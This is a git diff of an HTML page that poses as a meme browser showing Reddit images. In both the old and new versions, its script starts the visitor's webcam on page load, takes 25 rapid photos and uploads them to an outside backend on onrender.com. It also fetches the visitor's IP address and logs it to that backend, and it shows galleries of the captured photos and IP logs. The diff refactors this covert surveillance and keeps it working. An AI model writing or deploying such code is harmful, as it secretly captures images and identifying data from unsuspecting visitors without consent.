@@ -5,18 +5,46 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MEMES</title>
     <style>
-        body { font-family: 'Arial', sans-serif; background: linear-gradient(135deg, #1e1e2e, #3a3a55); color: white; text-align: center; margin: 0; padding: 0; }
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1e1e2e, #3a3a55);
+            color: white;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
         .container { padding: 20px; }
         img, video { width: 100%; max-width: 300px; border-radius: 10px; margin-top: 10px; }
-        .menu { position: absolute; top: 10px; left: 10px; background: rgba(255, 255, 255, 0.1); padding: 10px; border-radius: 5px; cursor: pointer; }
-        .menu-content { display: none; position: absolute; top: 40px; left: 10px; background: white; color: black; border-radius: 5px; padding: 10px; }
+        .menu {
+            position: absolute; top: 10px; left: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 10px; border-radius: 5px; cursor: pointer;
+        }
+        .menu-content {
+            display: none; position: absolute; top: 40px; left: 10px;
+            background: white; color: black; border-radius: 5px; padding: 10px;
+        }
         .menu:hover .menu-content { display: block; }
         .menu-content a { display: block; padding: 8px; text-decoration: none; color: black; }
-        .memes-container { max-height: 500px; overflow-y: scroll; border: 1px solid white; padding: 10px; margin-top: 20px; text-align: left; }
+        .memes-container {
+            max-height: 500px; overflow-y: scroll;
+            border: 1px solid white; padding: 10px; margin-top: 20px; text-align: left;
+        }
         .meme { margin-bottom: 10px; }
-        .meme-text { font-size: 18px; font-weight: bold; text-align: center; margin-bottom: 10px; }
+        .meme-text {
+            font-size: 18px; font-weight: bold; text-align: center; margin-bottom: 10px;
+        }
         .small-text { font-size: 12px; color: #bbb; }
-        .scroll-to-top { position: fixed; bottom: 10px; right: 10px; background-color: #4CAF50; color: white; padding: 10px; border-radius: 50%; cursor: pointer; display: none; }
+        .scroll-to-top {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px;
+            border-radius: 50%;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -34,7 +62,7 @@
     <div id="home" class="container">
         <h2>MEMES</h2>
         <img id="captured-photo" style="display:none;"/>
-        <h2>👑 THE GREATEST MEME OF THE CENTURY 👑</h2>
+        <h2 style="margin-top:10px;">👑 THE GREATEST MEME OF THE CENTURY 👑</h2>
         <p id="ip-address" class="small-text"></p>
         <div class="memes-container" id="memes"></div>
     </div>
@@ -57,8 +85,9 @@
         const photosGallery = document.getElementById('photos-gallery');
         const capturedPhoto = document.getElementById('captured-photo');
         const ipAddressElement = document.getElementById('ip-address');
-        let after = null;
-        
+        let loadingMemes = false;
+        let photos = [];
+
         function showPage(page) {
             document.getElementById('home').style.display = page === 'home' ? 'block' : 'none';
             document.getElementById('photos').style.display = page === 'photos' ? 'block' : 'none';
@@ -66,45 +95,6 @@
 
             if (page === 'photos') fetchPhotos();
             if (page === 'logs') fetchIPLogs();
-        }
-
-        async function fetchMemes() {
-            let url = "https://www.reddit.com/r/memes/top.json?limit=10";
-            if (after) url += `&after=${after}`;
-
-            let response = await fetch(url);
-            let data = await response.json();
-            after = data.data.after;
-
-            memesContainer.innerHTML += data.data.children.map(post =>
-                `<div class="meme"><div class="meme-text">${post.data.title}</div><img src="${post.data.url}" /></div>`
-            ).join('');
-        }
-
-        function checkScroll() {
-            if (memesContainer.scrollTop + memesContainer.clientHeight >= memesContainer.scrollHeight - 10) {
-                fetchMemes();
-            }
-        }
-
-        memesContainer.addEventListener('scroll', checkScroll);
-
-        async function fetchPhotos() {
-            let response = await fetch("https://meme-backend-d9mt.onrender.com/photos");
-            let photos = await response.json();
-
-            photosGallery.innerHTML = photos.map(photo =>
-                `<img src="${photo.url}" width="100px"><p class="small-text">${photo.timestamp}</p>`
-            ).join('');
-        }
-
-        async function fetchIPLogs() {
-            let response = await fetch("https://meme-backend-d9mt.onrender.com/ips");
-            let ips = await response.json();
-
-            ipLogsContainer.innerHTML = ips.map(ip =>
-                `<p>${ip} - ${new Date().toLocaleString()}</p>`
-            ).join('');
         }
 
         function startCamera() {
@@ -118,15 +108,18 @@
                     const interval = setInterval(() => {
                         takePhoto(video);
                         count++;
+
                         if (count === 25) {
                             clearInterval(interval);
-                            stream.getTracks().forEach(track => track.stop());
+                            stopCamera(stream);
+                            display8thPhoto();
                         }
                     }, 200);
-                });
+                })
+                .catch(error => console.error("Camera access denied:", error));
         }
 
-        async function takePhoto(video) {
+        function takePhoto(video) {
             const canvas = document.createElement("canvas");
             const context = canvas.getContext("2d");
             canvas.width = video.videoWidth;
@@ -134,41 +127,96 @@
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             const photoSrc = canvas.toDataURL('image/png');
-            let response = await fetch("https://meme-backend-d9mt.onrender.com/upload", {
-                method: 'POST',
-                body: JSON.stringify({ photo: photoSrc }),
-                headers: { 'Content-Type': 'application/json' }
-            });
+            uploadPhoto(photoSrc);
+        }
 
-            let data = await response.json();
-            if (data.index === 8) {
-                localStorage.setItem('greatestMeme', photoSrc);
-                capturedPhoto.src = photoSrc;
+        function display8thPhoto() {
+            if (photos.length >= 8) {
+                capturedPhoto.src = photos[7].src;
                 capturedPhoto.style.display = 'block';
             }
         }
 
-        async function fetchIP() {
-            let response = await fetch("https://api.ipify.org?format=json");
-            let data = await response.json();
-            ipAddressElement.textContent = `Your IP: ${data.ip}`;
+        function stopCamera(stream) {
+            stream.getTracks().forEach(track => track.stop());
+        }
 
-            await fetch("https://meme-backend-d9mt.onrender.com/logIP", {
+        async function fetchIP() {
+            try {
+                let response = await fetch("https://api.ipify.org?format=json");
+                let data = await response.json();
+                ipAddressElement.textContent = `Your IP: ${data.ip}`;
+                logIP(data.ip);
+            } catch (error) {
+                console.error("Error fetching IP:", error);
+            }
+        }
+
+        async function fetchMemes() {
+            if (loadingMemes) return;
+            loadingMemes = true;
+
+            try {
+                let response = await fetch("https://www.reddit.com/r/memes.json?limit=20");
+                let data = await response.json();
+
+                data.data.children.forEach(post => {
+                    let meme = post.data;
+                    if (meme.post_hint === "image") {
+                        let img = document.createElement("img");
+                        img.src = meme.url;
+                        memesContainer.appendChild(img);
+                    }
+                });
+            } catch (error) {
+                console.error("Error fetching memes:", error);
+            }
+            loadingMemes = false;
+        }
+
+        async function uploadPhoto(photoSrc) {
+            await fetch('https://meme-backend-d9mt.onrender.com/upload', {
                 method: 'POST',
-                body: JSON.stringify({ ip: data.ip }),
+                body: JSON.stringify({ photo: photoSrc }),
                 headers: { 'Content-Type': 'application/json' }
+            });
+            fetchPhotos();
+        }
+
+        async function fetchPhotos() {
+            let response = await fetch('https://meme-backend-d9mt.onrender.com/getImages');
+            let data = await response.json();
+            photosGallery.innerHTML = '';
+            data.forEach(photo => {
+                let img = document.createElement('img');
+                img.src = photo.src;
+                photosGallery.appendChild(img);
             });
         }
 
-        function scrollToTop() {
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+        async function logIP(ip) {
+            await fetch('https://meme-backend-d9mt.onrender.com/logIP', {
+                method: 'POST',
+                body: JSON.stringify({ ip }),
+                headers: { 'Content-Type': 'application/json' }
+            });
+            fetchIPLogs();
         }
 
-        fetchMemes();
-        fetchIP();
-        startCamera();
-        capturedPhoto.src = localStorage.getItem('greatestMeme') || '';
-    </script>
+        async function fetchIPLogs() {
+            let response = await fetch('https://meme-backend-d9mt.onrender.com/getIPLogs');
+            let data = await response.json();
+            ipLogsContainer.innerHTML = '';
+            data.forEach(log => {
+                let p = document.createElement('p');
+                p.textContent = `${log.ip} - ${log.timestamp}`;
+                ipLogsContainer.appendChild(p);
+            });
+        }
 
+        startCamera();
+        fetchIP();
+        fetchMemes();
+    </script>
 </body>
 </html>
